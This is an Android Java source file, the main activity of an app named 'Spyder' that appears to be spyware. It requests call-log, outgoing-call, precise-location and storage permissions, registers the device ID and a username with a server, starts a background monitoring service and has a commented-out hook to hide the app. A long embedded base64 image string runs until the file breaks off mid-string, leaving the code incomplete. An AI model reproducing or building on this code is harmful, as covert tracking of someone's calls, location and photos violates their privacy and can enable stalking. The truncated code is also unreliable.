package com.spyder.app.activitys;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.wifi.WifiManager;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.spyder.app.activitys.R;
import com.spyder.app.activitys.presenter.SpyderContract;
import com.spyder.app.activitys.presenter.SpyderPresenter;
import com.spyder.app.activitys.reciever.NetworkChangedReceiver;
import com.spyder.app.activitys.request.CallHistoryDetails;
import com.spyder.app.activitys.request.CallHistoryDetailsPojo;
import com.spyder.app.activitys.request.LocationDetail;
import com.spyder.app.activitys.request.LocationDetails;
import com.spyder.app.activitys.request.PhotoDetail;
import com.spyder.app.activitys.request.UserDetails;
import com.spyder.app.activitys.request.UserDetails_;
import com.spyder.app.activitys.request.UserId;
import com.spyder.app.activitys.request.UserPhotoDetailList;
import com.spyder.app.activitys.response.BaseContext;
import com.spyder.app.activitys.response.UserDetailsResponse;
import com.spyder.app.activitys.service.SpyderService;
import com.spyder.app.activitys.util.CommonUtil;

import com.spyder.app.activitys.util.GalleryImagesActivity;
import com.spyder.app.activitys.util.GetDetailsInformation;
import com.spyder.app.activitys.util.MyLog;
import com.spyder.app.activitys.util.SharedPref;
import com.spyder.app.activitys.view.activities.BaseActivity;
import com.spyder.app.activitys.view.activities.LocationDatabase;
import com.spyder.app.activitys.webservices.GPSTrack;
import com.spyder.app.activitys.webservices.Mediator;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.internal.Util;

public class MainActivity extends BaseActivity implements SpyderContract.View {
    public static int REQUEST_PERMISSIONS = 1;
    private Mediator mediator;
    protected SpyderPresenter mSpyderPresenter;
    Gson gson = new Gson();
    private List<LocationDetail> locationDetailList;
    private List<PhotoDetail> photoDetailList;
    private String timeStamp;
    private SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd-MM-yyyy hh:mm:ssaa");
    private String getlangitude, getLattitude;
    private GPSTrack gpsTrack;
    private NetworkChangedReceiver mWifiReceiver;
    private Button registerButton;
    private EditText nameEditText;
    private SharedPref sharedPref;
    private boolean boolean_permission;
    com.spyder.app.activitys.view.activities.Browser browser;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mWifiReceiver = new NetworkChangedReceiver();
        setContentView(R.layout.activity_main);

        gpsTrack = new GPSTrack(MainActivity.this);
        browser = new com.spyder.app.activitys.view.activities.Browser();

        getlangitude = gpsTrack.currentLangitude;
        getLattitude = gpsTrack.currentLattitude;

        registerButton = (Button) findViewById(R.id.register_button);
        nameEditText = (EditText) findViewById(R.id.name);


        timeStamp = simpleDateFormat.format(new Date());
        mediator = Mediator.getInstance(getApplicationContext());
        mSpyderPresenter = new SpyderPresenter(this, getApplicationContext());
        sharedPref = new SharedPref(getApplicationContext());
        // calluserDetails();
        //callPhotoDetails();

        registerWifiReceiver();
        permission();

        registerButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // hideTheApp();
             calluserDetails();
              //  startActivity(new Intent(MainActivity.this, GalleryImagesActivity.class));
            }
        });
    }

    private void permission() {
        if ((ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED) ||
                (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED)) {

            if ((ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this, android.Manifest.permission.PROCESS_OUTGOING_CALLS))) {
            } else {
                ActivityCompat.requestPermissions(MainActivity.this, new String[]{android.Manifest.permission.PROCESS_OUTGOING_CALLS, Manifest.permission.READ_CALL_LOG, Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.READ_EXTERNAL_STORAGE},
                        REQUEST_PERMISSIONS);

            }

            if ((ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this, Manifest.permission.PROCESS_OUTGOING_CALLS))) {
            } else {
                ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.PROCESS_OUTGOING_CALLS, Manifest.permission.READ_CALL_LOG, Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.READ_EXTERNAL_STORAGE},
                        REQUEST_PERMISSIONS);

            }
        } else {
            boolean_permission = true;


        }
    }

    @Override
    public void successResponse(BaseContext baseContext) {
        hideProgressDialog();

        if (baseContext instanceof UserDetailsResponse) {
            sharedPref.setUserId(((UserDetailsResponse) baseContext).getUserId());
            sharedPref.setLogin(true);

        }
        MyLog.log("success", "cccccccccccc" + baseContext.getStatus());
        startService(new Intent(MainActivity.this, SpyderService.class));
    }

    @Override
    public void failureResponse(String error) {
        hideProgressDialog();
        MyLog.log("responce......fail............", error);

    }

    public void calluserDetails() {

        UserDetails details = new UserDetails();
        UserDetails_ details_ = new UserDetails_();

        details_.setDeviceid(Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ANDROID_ID));
        // details_.setUserId("1");
        details_.setUsername(nameEditText.getText().toString());

        details.setUserDetails(details_);
        MyLog.log("details", gson.toJson(details));
        showProgressDialog();
        mSpyderPresenter.saveUserDetails(details);

    }


    public void callPhotoDetails() {

        photoDetailList = new ArrayList<>();
        UserPhotoDetailList userPhotoDetailList = new UserPhotoDetailList();
        PhotoDetail photoDetail = new PhotoDetail();

      //  photoDetailList = new ArrayList<>();

        photoDetail.setImage("/9j/4AAQSkZJRgABAQAAAQABAAD//gA7Q1JFQVRPUjogZ2QtanBlZyB2MS4wICh1c2luZyBJSkcgSlBFRyB2NjIpLCBxdWFsaXR5ID0gOTAK/9sAQwADAgIDAgIDAwMDBAMDBAUIBQUEBAUKBwcGCAwKDAwLCgsLDQ4SEA0OEQ4LCxAWEBETFBUVFQwPFxgWFBgSFBUU/9sAQwEDBAQFBAUJBQUJFA0LDRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQU/8AAEQgBkAJYAwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAwQHBQQEAAECdwABAgMRBAUhMQYSQVEHYXETIjKBCBRCkaGxwQkjM1LwFWJy0QoWJDThJfEXGBkaJicoKSo1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX29/j5+v/aAAwDAQACEQMRAD8A/VOiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAoopM80ALRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAhqpqV8NNsZrlhkRjP61crmfH9z9n0Fl/vsF/rQBzZ+JWoFziG32Z4yrZ/nV63+JmB++tMnvsOK4DfRvoA9Pt/iNp8v+sR4frk/yFaNv4y0m5xtugp/2gR/OvH99G+gD2+LV7Kb7l1CfbeKtK6uMqwI9Qa8IWdkOVYqfUHFWU1m9jxtu5wB2Eh/xoA9worx628Z6rajCXRP++A3860Lf4j6lHjzdkv8AwED+QoA9RorgLf4oE8TWnHqrZrRt/iTpsnEkcyH/AHRj+dAHXUVhw+M9ImAP2xE9m61p22o212B5Myyf7tAFmikzQKAFooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAriPihcqun28OfmL7se2DXb15l8V5calZoTx5Ocf8CNAHF763/DHhh/EjShZhCEGclc56f41zW8V6f8LIV/sm5lx8xlxn2wKAMu6+Gd7CMxXEc3sB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4m0+cYJYj0ZR/jSi30W/+Y2tpIe++FT/AEoA+OyGHYj6im7q+u7/AMCeHdX/ANbplv0x+6TZ/LFYd18EfCdwpxYvEx6FZn/xoA+Yd3vRu9697v8A9nWwkGbW/ki9mXP9awLz9nTUowxt9Qgk9A2R/SgDyPd70bveu51D4KeJrNiI7UXQ9Ysn+lYWo/D/AMQ6Upa506WJR3IoAw93vRu96SW3lhbDoVNRncO1AHpPwLsvtnjVGPIhQvn3/wAivpmvB/2b9OZrvVrtl+VVjVT9d+f5V7xQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFACVBfQfabSWPuwqxRQB5ZNGYZnjbgqSDTK2PEumyW+pSOFJSQlgR71StdJubpgI4zz3PSgCp1orpbXwXOxBnlRB/sZJrXtPCllbj5184+rcUAcRFazT42RO30U1qW3hW+n2lkEanuWH8q7eG1ht1CxxqoHoKloAwdO8LLaOGklL4wcCt4DAAHSlooATFGKWigBMUYpaKAGvGJFZWGQeCKwr7wHoOpNuuNMgkY9WK81v0UAU9L0m00SzW1soFggU5CL0zVyiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigBrIHGGGRSgYGB0paKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKK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